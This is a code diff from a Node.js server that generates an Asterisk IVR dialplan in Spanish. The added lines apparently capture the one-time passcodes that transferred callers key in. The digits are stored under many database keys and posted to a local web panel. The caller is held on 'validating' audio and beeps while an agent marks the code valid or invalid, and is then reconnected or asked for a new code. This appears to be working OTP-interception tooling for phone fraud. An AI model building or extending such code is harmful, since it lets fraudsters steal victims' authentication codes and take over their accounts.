+    dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA 777] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Agente: \${FINAL_AGENT} ===)\n`;
     dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
     dialplanContent += `; 2b. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
     dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
     dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
-    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
-    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
-    dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=1001)\n`;
+    dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
+    dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(__IVR_AGENT_EXTEN=1001)\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(DB(ivr_vars/global_agent_exten)=\${CALLERID(num)})\n`;
     dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
     dialplanContent += `; 2b. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)\n`;
     dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
     dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
-    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
+    dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
     dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n`;
     dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
     dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
-    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
+    dialplanContent += ` same => n,Set(__CALL_DEST=8888)\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/8888)=\${CALLERID(num)})\n`;
     dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
     dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
@@ -1518,9 +1593,18 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_codes/7777)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_captures/7777)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_codes/8888)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_captures/8888)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
     dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
     dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
-    dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
+    dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&callerid=\${CALLERID(num)}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
 
     dialplanContent += ` ; PASO DE ESPERA: Locucion 'Un momento por favor, estamos validando...'\n`;
     dialplanContent += ` same => n(espera_validacion),NoOp(=== [CAPTURA-7777] Reproduciendo audio de espera: \${AUDIO_WAIT} ===)\n`;
@@ -1531,21 +1615,38 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
     dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
     dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
-    dialplanContent += ` same => n,Set(CURRENT_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
-    dialplanContent += ` same => n,ExecIf($["\${CURRENT_STATUS}" = ""]?Set(CURRENT_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
-    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Ciclo \${WAIT_LOOP}/45 - Estado en AstDB: \${CURRENT_STATUS} ===)\n`;
+    dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/7777)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/8888)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
+    dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
+    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, CID: \${CALLERID(num)}, Code: \${USER_DIGITS}) ===)\n`;
 
     dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
     dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
-    dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 45]?codigo_aprobado)\n`;
+    dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 60]?codigo_aprobado)\n`;
 
-    dialplanContent += ` ; Cada 5 segundos un breve tono para mantener canal abierto y calmar al cliente\n`;
+    dialplanContent += ` ; Tono suave cada 5 segundos para mantener canal abierto\n`;
     dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
     dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;
 
     dialplanContent += ` ; RAMA APROBADO: Asesor marco VALIDO en la web -> Locucion de exito y reconecta con el asesor\n`;
     dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-7777] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/7777)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/8888)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
     dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
     dialplanContent += ` same => n,Wait(0.5)\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
@@ -1555,6 +1656,13 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-7777] TOKEN INVALIDO DETECTADO -> REINTENTANDO ===)\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
     dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
     dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
 
@@ -1639,13 +1747,24 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     dialplanContent += `; Caso: Usuario ingreso codigo OTP (>= 4 digitos, ej. 6 digitos)\n`;
     dialplanContent += ` same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_codes/7777)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_captures/7777)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_codes/8888)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_captures/8888)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
     dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
     dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
-    dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
+    dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&callerid=\${CALLERID(num)}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
 
     dialplanContent += ` ; Reproducir locución de validación en curso al usuario\n`;
     dialplanContent += ` same => n,NoOp(=== [IVR] Reproduciendo audio de validacion en curso: \${IVR_WAIT} ===)\n`;
@@ -1656,29 +1775,55 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,NoOp(=== [IVR] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
     dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
     dialplanContent += ` same => n(wait_decision_loop),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
-    dialplanContent += ` same => n,Set(CURRENT_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
-    dialplanContent += ` same => n,NoOp(=== [IVR] Ciclo \${WAIT_LOOP}/20 - Estado en AstDB: \${CURRENT_STATUS} ===)\n`;
+    dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/7777)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/8888)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
+    dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
+    dialplanContent += ` same => n,NoOp(=== [IVR] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, CID: \${CALLERID(num)}, Code: \${USER_DIGITS}) ===)\n`;
     dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?otp_approved)\n`;
     dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?otp_rejected_retry)\n`;
-    dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 20]?otp_approved)\n`;
+    dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 60]?otp_approved)\n`;
+    dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
     dialplanContent += ` same => n,Goto(wait_decision_loop)\n\n`;
 
     dialplanContent += ` ; Rama Aprobado: El asesor marcó CÓDIGO VÁLIDO -> Volver llamada al asesor\n`;
     dialplanContent += ` same => n(otp_approved),NoOp(=== [IVR] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR ===)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/7777)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/8888)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
     dialplanContent += ` same => n,Playback(\${IVR_SUCCESS})\n`;
-    dialplanContent += ` same => n,Wait(1)\n`;
-    dialplanContent += ` same => n,Set(CALLER_EXT=\${CALLERID(num)})\n`;
-    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
-    dialplanContent += ` ; Si la prueba fue marcada desde el softphone 1002 hacia 8888, transferir al agente en 1001 para verificar el regreso\n`;
-    dialplanContent += ` same => n,ExecIf($["\${CALLER_EXT}" = "\${FINAL_AGENT}"]?Set(FINAL_AGENT=1002))\n`;
+    dialplanContent += ` same => n,Wait(0.5)\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})})})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/8888)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
     dialplanContent += ` same => n,NoOp(=== [IVR] RECONECTANDO LLAMADA CON EL ASESOR EN EXTENSION \${FINAL_AGENT} ===)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
     dialplanContent += ` ; Rama Inválido: El asesor marcó CÓDIGO INVÁLIDO -> Solicitar nuevo código automáticamente\n`;
     dialplanContent += ` same => n(otp_rejected_retry),NoOp(=== [IVR] TOKEN INVALIDO DETECTADO -> SOLICITANDO NUEVO CODIGO AUTOMATICAMENTE ===)\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/7777)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/8888)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
     dialplanContent += ` same => n,Playback(\${IVR_FAILURE})\n`;
     dialplanContent += ` same => n,Goto(ask_input)\n\n`;
 
